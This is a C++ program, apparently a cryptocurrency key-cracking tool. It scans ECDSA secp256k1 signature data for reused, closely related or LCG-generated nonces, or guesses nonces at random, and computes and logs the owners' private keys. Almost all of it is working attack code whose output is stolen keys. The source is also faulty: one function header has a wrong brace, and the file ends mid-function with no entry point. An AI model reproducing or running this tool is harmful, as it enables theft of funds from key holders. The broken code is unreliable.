#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <set>
#include <mutex>
#include <thread>
#include <atomic>
#include <algorithm>
#include <filesystem>
#include <chrono>
#include <secp256k1.h>
#include <openssl/bn.h>
#include <openssl/rand.h>

using namespace std;
namespace fs = std::filesystem;

static const char* N_HEX = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";

struct SignatureEntry {
    string index, msg_hex, r_hex, s_hex, r_clean, s_clean, z_clean;
};

static mutex g_out_mutex;
static ofstream g_out_json_f, g_out_txt_f, g_out_k_f, g_out_deltas_f;
static set<string> g_found_privkeys;
static atomic<long long> g_total_iterations(0), g_keys_cracked(0);

static inline string hexlower(string s) { transform(s.begin(), s.end(), s.begin(), ::tolower); return s; }
static inline bool is_hexlike(const string& s) { return !s.empty() && all_of(s.begin(), s.end(), ::isxdigit); }

static string to_hex(const unsigned char* p, size_t n) {
    static const char* he = "0123456789abcdef";
    string s(n * 2, ' ');
    for(size_t i = 0; i < n; i++) { s[2*i] = he[p[i] >> 4]; s[2*i+1] = he[p[i] & 0xF]; }
    return s;
}

static vector<unsigned char> from_hex(string s) {
    if(s.length() % 2 != 0) s = "0" + s;
    vector<unsigned char> res(s.length() / 2);
    for (size_t i = 0; i < s.length(); i += 2) sscanf(s.substr(i, 2).c_str(), "%x", (unsigned int*)&res[i/2]);
    return res;
}

static string extract_json_field(const string& line, const string& key) {
    size_t pos = line.find("\"" + key + "\"");
    if (pos == string::npos) return "";
    pos = line.find(":", pos); if (pos == string::npos) return "";
    size_t start = line.find("\"", pos);
    if (start != string::npos) {
        size_t end = line.find("\"", start + 1);
        return (end != string::npos) ? line.substr(start + 1, end - start - 1) : "";
    }
    size_t run = pos + 1; while(run < line.size() && (isspace(line[run]) || line[run] == ',' || line[run] == ':')) run++;
    size_t vend = run; while(vend < line.size() && line[vend] != ',' && line[vend] != '}' && line[vend] != ']') vend++;
    string chunk = line.substr(run, vend - run);
    chunk.erase(remove_if(chunk.begin(), chunk.end(), ::isspace), chunk.end());
    return chunk;
}

static bool verify_and_log_privkey(const string& p_hex, const SignatureEntry& entry, const string& source) {
    lock_guard<mutex> lock(g_out_mutex);
    if (g_found_privkeys.count(p_hex)) return true;
    secp256k1_context* ctx = secp256k1_context_create(SECP256K1_CONTEXT_SIGN | SECP256K1_CONTEXT_VERIFY);
    vector<unsigned char> priv_bytes = from_hex(p_hex);
    secp256k1_pubkey pubkey;
    if (secp256k1_ec_pubkey_create(ctx, &pubkey, priv_bytes.data()) == 1) {
        unsigned char pub_compressed[33]; size_t out_len = 33;
        secp256k1_ec_pubkey_serialize(ctx, pub_compressed, &out_len, &pubkey, SECP256K1_EC_COMPRESSED);
        string computed_pub = to_hex(pub_compressed, out_len);
        g_found_privkeys.insert(p_hex); g_keys_cracked++;
        if (g_out_txt_f.is_open()) g_out_txt_f << p_hex << " # Via " << source << " Idx " << entry.index << "\n" << flush;
        if (g_out_json_f.is_open()) g_out_json_f << "{\"index\":\"" << entry.index << "\",\"method\":\"" << source << "\",\"private_key\":\"" << p_hex << "\",\"public_key\":\"" << computed_pub << "\"}\n" << flush;
        cout << "\n[!] SUCCESS: Private Key Found (" << source << "): 0x" << p_hex << "\n";
        secp256k1_context_destroy(ctx); return true;
    }
    secp256k1_context_destroy(ctx); return false;
}

static bool test_k_candidate(BIGNUM* k, const BIGNUM* r, const BIGNUM* s, const BIGNUM* z, const BIGNUM* N, BN_CTX* ctx, const SignatureEntry& entry, const string& method) {
    if (BN_is_zero(k) || BN_cmp(k, N) >= 0) return false;
    BIGNUM *r_inv = BN_new(), *sk = BN_new(), *sk_z = BN_new(), *priv = BN_new();
    bool success = false;
    if (BN_mod_inverse(r_inv, r, N, ctx)) {
        BN_mod_mul(sk, s, k, N, ctx); BN_mod_sub(sk_z, sk, z, N, ctx); BN_mod_mul(priv, sk_z, r_inv, N, ctx);
        char* hex_str = BN_bn2hex(priv);
        if (hex_str) {
            string p_hex = hexlower(string(hex_str)); OPENSSL_free(hex_str);
            while(p_hex.size() < 64) p_hex = "0" + p_hex;
            if (verify_and_log_privkey(p_hex, entry, method)) {
                if (g_out_k_f.is_open()) {
                    char* k_hex = BN_bn2hex(k);
                    if (k_hex) { g_out_k_f << "{\"index\":\"" << entry.index << "\",\"k_hex\":\"" << hexlower(string(k_hex)) << "\"}\n" << flush; OPENSSL_free(k_hex); }
                }
                success = true;
            }
        }
    }
    BN_free(r_inv); BN_free(sk); BN_free(sk_z); BN_free(priv); return success;
}

static void run_differential_gap(const SignatureEntry& e1, const BIGNUM* e1_r, const BIGNUM* e1_s, const BIGNUM* e1_z, const BIGNUM* e2_s, const BIGNUM* e2_z, const BIGNUM* r_ratio, const BIGNUM* N, BN_CTX* ctx, const vector<long long>& dg_seeds, long long dg_max_delta, int dg_fill_step, int dg_per_pair_cap, BIGNUM* target_k_delta, BIGNUM* tmp, BIGNUM* num, BIGNUM* den, BIGNUM* den_inv, BIGNUM* k_sol, const string& idx2) {
    int count = 0;
    for (long long seed : dg_seeds) {
        if (count >= dg_per_pair_cap) break;
        for (long long delta = -dg_max_delta; delta <= dg_max_delta; delta += dg_fill_step) {
            long long val = seed + delta; if (val <= 0) continue;
            if (++count >= dg_per_pair_cap) break;
            BN_set_word(target_k_delta, (unsigned long long)val);
            BN_mod_mul(tmp, e2_s, target_k_delta, N, ctx); BN_mod_sub(num, tmp, e1_z, N, ctx);
            BN_mod_mul(tmp, r_ratio, e2_z, N, ctx); BN_mod_add(num, num, tmp, N, ctx);
            BN_mod_mul(tmp, r_ratio, e2_s, N, ctx); BN_mod_sub(den, e1_s, tmp, N, ctx);
            if (BN_mod_inverse(den_inv, den, N, ctx)) {
                BN_mod_mul(k_sol, num, den_inv, N, ctx);
                if (test_k_candidate(k_sol, e1_r, e1_s, e1_z, N, ctx, e1, "Differential Gap Explorer")) {
                    if (g_out_deltas_f.is_open()) { lock_guard<mutex> lock(g_out_mutex); g_out_deltas_f << "{\"idx1\":\"" << e1.index << "\",\"idx2\":\"" << idx2 << "\",\"detected_delta\":\"" << val << "\"}\n"; }
                }
            }
        }
    }
}

static void run_lcg(const SignatureEntry& e1, const BIGNUM* e1_r, const BIGNUM* e1_s, const BIGNUM* e1_z, const BIGNUM* e2_s, const BIGNUM* e2_z, const BIGNUM* r_ratio, const BIGNUM* N, BN_CTX* ctx, long long lcg_a_max, long long lcg_b_max, int lcg_per_pair_cap, BIGNUM* bn_a, BIGNUM* bn_b, BIGNUM* tmp, BIGNUM* num, BIGNUM* den, BIGNUM* den_inv, BIGNUM* k_sol) {
    int count = 0;
    for (long long a = 1; a <= lcg_a_max; a++) {
        if (count >= lcg_per_pair_cap) break;
        BN_set_word(bn_a, a);
        for (long long b = 1; b <= lcg_b_max; b++) {
            if (++count >= lcg_per_pair_cap) break;
            BN_set_word(bn_b, b);
            BN_mod_mul(tmp, e2_s, bn_b, N, ctx); BN_mod_sub(num, tmp, e1_z, N, ctx);
            BN_mod_mul(tmp, r_ratio, e2_z, N, ctx); BN_mod_add(num, num, tmp, N, ctx);
            BN_mod_mul(tmp, bn_a, r_ratio, N, ctx); BN_mod_mul(tmp, tmp, e2_s, N, ctx); BN_mod_sub(den, e1_s, tmp, N, ctx);
            if (BN_mod_inverse(den_inv, den, N, ctx)) { BN_mod_mul(k_sol, num, den_inv, N, ctx); test_k_candidate(k_sol, e1_r, e1_s, e1_z, N, ctx, e1, "LCG Linked Matrix"); }
        }
    }
}

void execution_worker(int thread_id, const vector<SignatureEntry>& entries, int max_iter, long long dg_max_delta, const vector<long long>& dg_seeds, int dg_fill_step, int dg_per_pair_cap, long long lcg_a_max, long long lcg_b_max, int lcg_per_pair_cap, int scan_rand_k) }
    BN_CTX* ctx = BN_CTX_new(); BIGNUM* N = BN_new(); BN_hex2bn(&N, N_HEX);
    BIGNUM *top = BN_new(), *bot = BN_new(), *bot_inv = BN_new(), *k_sol = BN_new(), *r_ratio = BN_new(), *e2_r_inv = BN_new();
    BIGNUM *num = BN_new(), *den = BN_new(), *den_inv = BN_new(), *tmp = BN_new(), *target_k_delta = BN_new(), *bn_a = BN_new(), *bn_b = BN_new();

    for (size_t i = thread_id; i < entries.size(); i += max_iter) {
        const auto& e1 = entries[i];
        BIGNUM *e1_r = BN_new(), *e1_s = BN_new(), *e1_z = BN_new();
        BN_hex2bn(&e1_r, e1.r_clean.c_str()); BN_hex2bn(&e1_s, e1.s_clean.c_str()); BN_hex2bn(&e1_z, e1.z_clean.c_str());
        
        for (size_t j = i + 1; j < entries.size(); j++) {
            const auto& e2 = entries[j];
            BIGNUM *e2_r = BN_new(), *e2_s = BN_new(), *e2_z = BN_new();
            BN_hex2bn(&e2_r, e2.r_clean.c_str()); BN_hex2bn(&e2_s, e2.s_clean.c_str()); BN_hex2bn(&e2_z, e2.z_clean.c_str());
            g_total_iterations++;
            
            if (BN_cmp(e1_r, e2_r) == 0 && BN_cmp(e1_s, e2_s) != 0) {
                BN_mod_sub(top, e1_z, e2_z, N, ctx); BN_mod_sub(bot, e1_s, e2_s, N, ctx);
                if (BN_mod_inverse(bot_inv, bot, N, ctx)) { BN_mod_mul(k_sol, top, bot_inv, N, ctx); test_k_candidate(k_sol, e1_r, e1_s, e1_z, N, ctx, e1, "Shared Nonce (k1=k2)"); }
            }
            if (BN_mod_inverse(e2_r_inv, e2_r, N, ctx)) {
                BN_mod_mul(r_ratio, e1_r, e2_r_inv, N, ctx);
                run_differential_gap(e1, e1_r, e1_s, e1_z, e2_s, e2_z, r_ratio, N, ctx, dg_seeds, dg_max_delta, dg_fill_step, dg_per_pair_cap, target_k_delta, tmp, num, den, den_inv, k_sol, e2.index);
                run_lcg(e1, e1_r, e1_s, e1_z, e2_s, e2_z, r_ratio, N, ctx, lcg_a_max, lcg_b_max, lcg_per_pair_cap, bn_a, bn_b, tmp, num, den, den_inv, k_sol);
            }
            BN_free(e2_r); BN_free(e2_s); BN_free(e2_z);
        }
        if (scan_rand_k > 0) {
            unsigned char buf[32];
            for (int rk = 0; rk < scan_rand_k; rk++) { RAND_bytes(buf, 32); BN_bin2bn(buf, 32, k_sol); BN_mod(k_sol, k_sol, N, ctx); test_k_candidate(k_sol, e1_r, e1_s, e1_z, N, ctx, e1, "Random Nonce Brute"); }
        }
        BN_free(e1_r); BN_free(e1_s); BN_free(e1_z);
    }
